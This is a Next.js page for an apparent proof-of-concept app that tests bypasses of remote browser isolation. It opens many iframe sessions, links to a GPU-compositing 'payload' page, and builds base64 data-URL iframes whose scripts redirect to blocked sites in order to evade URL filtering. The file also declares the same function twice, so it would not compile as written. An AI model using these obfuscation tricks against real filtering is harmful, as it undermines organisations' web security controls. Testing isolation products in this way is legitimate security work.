import Head from 'next/head';
import Header from '@components/Header';
import Footer from '@components/Footer';
import { useState } from 'react';

export default function Home() {
  const [sessions, setSessions] = useState([]);

  /**
   * Open 15 tabs with a slight delay between each session
   */
  const openMultipleSessions = () => {
    const url = 'https://rbidemo.netlify.app'; // Target URL
    const newSessions = [];

    for (let i = 0; i < 15; i++) {
      setTimeout(() => {
        newSessions.push(
          <iframe
            key={i}
            src={url}
            title={`Session ${i + 1}`}
            style={{
              width: '100%',
              height: '200px',
              border: '1px solid black',
              marginBottom: '10px',
            }}
          ></iframe>
        );
        setSessions([...newSessions]);
      }, i * 3000); // 3-second delay between tabs
    }
  };

  /**
   * Trigger the GPU/WebGL payload by navigating to /lab1
   */
  const triggerPayload = () => {
    window.location.href = '/lab1';
  };

  /**
   * Create an iframe with an obfuscated Base64 URL
   */
  const createObfuscatedIframe = () => {
    setSessions([
      <iframe
        key={1}
        src="data:text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD53aW5kb3cubG9jYXRpb24gPSAnaHR0cHM6Ly93d3cud3NqLmNvbSc7PC9zY3JpcHQ+PC9ib2R5PjwvaHRtbD4="
        title="Obfuscated WSJ"
        style={{
          width: '100%',
          height: '200px',
          border: '1px solid black',
          marginBottom: '10px',
        }}
      ></iframe>,
    ]);
  };
/**
   * Create an iframe and bypass URL filtering with Base64 URL
   */
 const createObfuscatedIframe = () => {
  const base64Html = 'data:text/html;base64,' + btoa(`
    <html>
      <body>
        <script>
          window.location.href = "https://www.weapons.com";
        </script>
      </body>
    </html>
  `);

  setSessions([
    <iframe
      key={1}
      src={base64Html}
      title="Obfuscated Redirect"
      style={{
        width: '100%',
        height: '200px',
        border: '1px solid black',
        marginBottom: '10px',
      }}
    ></iframe>,
  ]);
};
  /**
   * Check the browser version
   */
  const checkBrowserVersion = () => {
    const userAgent = navigator.userAgent;
    const versionMatch = userAgent.match(/Chrome\/[0-9.]+/);

    if (versionMatch) {
      console.log(`Detected Chrome Version: ${versionMatch[0]}`);
      alert(`Detected Chrome Version: ${versionMatch[0]}`);
    } else {
      console.log('Unable to detect Chrome version.');
      alert('Unable to detect Chrome version.');
    }
  };

  /**
   * Trigger a redirect chain
   */
  const redirectChain = () => {
    setTimeout(() => {
      setSessions([
        <iframe
          key={1}
          src="https://trusted-server.com/step1"
          title="Redirect Chain"
          style={{
            width: '100%',
            height: '200px',
            border: '1px solid black',
            marginBottom: '10px',
          }}
        ></iframe>,
      ]);
    }, 1000);
  };

  /**
   * Trigger a headless session
   */
  const openHeadlessSession = () => {
    fetch('https://trusted-server.com/start-headless', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'startSession' }),
    })
      .then((response) => response.json())
      .then((data) => console.log('Headless session started:', data))
      .catch((error) => console.error('Error:', error));
  };

  return (
    <div className="container">
      <Head>
        <title>RBI Testing PoC</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <main>
        <Header title="RBI PoC Testing App!" />
        <h1>RBI PoC Testing</h1>
        <p>
          This application demonstrates various RBI bypass PoCs, including opening multiple sessions, triggering GPU-based payloads, and testing obfuscated links.
        </p>

        <hr />

        {/* Section: Open Multiple Sessions */}
        <section>
          <h2>Open Multiple Sessions</h2>
          <p>Click the button below to open 15 new sessions of <code>https://rbidemo.netlify.app</code>.</p>
          <button onClick={openMultipleSessions}>Open 15 Sessions</button>
          <div style={{ marginTop: '20px' }}>{sessions}</div>
        </section>

        <hr />

        {/* Section: Trigger GPU Payload */}
        <section>
          <h2>Trigger Payload</h2>
          <p>
            Click the button below to load the GPU compositing vulnerability payload for educational purposes.
          </p>
          <button onClick={triggerPayload}>Trigger Payload</button>
        </section>

        <hr />

        {/* Section: Obfuscated Link */}
        <section>
          <h2>Obfuscated Link</h2>
          <p>
            Click the button below to test how RBI handles obfuscated access to WSJ.com via Base64 encoding:
          </p>
          <button onClick={createObfuscatedIframe}>Open Obfuscated WSJ</button>
        </section>

        <hr />

        {/* Section: Check Browser Version */}
        <section>
          <h2>Check Browser Version</h2>
          <p>Click the button below to check the browser's version:</p>
          <button onClick={checkBrowserVersion}>Check Chrome Version</button>
        </section>

        <hr />

        {/* Section: Redirect Chain */}
        <section>
          <h2>Redirect Chain</h2>
          <p>Click the link below to start a redirect chain:</p>
          <button onClick={redirectChain}>Start Redirect Chain</button>
        </section>

        <hr />

        {/* Section: Trigger Headless Session */}
        <section>
          <h2>Trigger Headless Session</h2>
          <p>Click the button below to simulate starting a headless session:</p>
          <button onClick={openHeadlessSession}>Open Headless Chrome Session</button>
        </section>
      </main>

      <Footer />
    </div>
  );
}
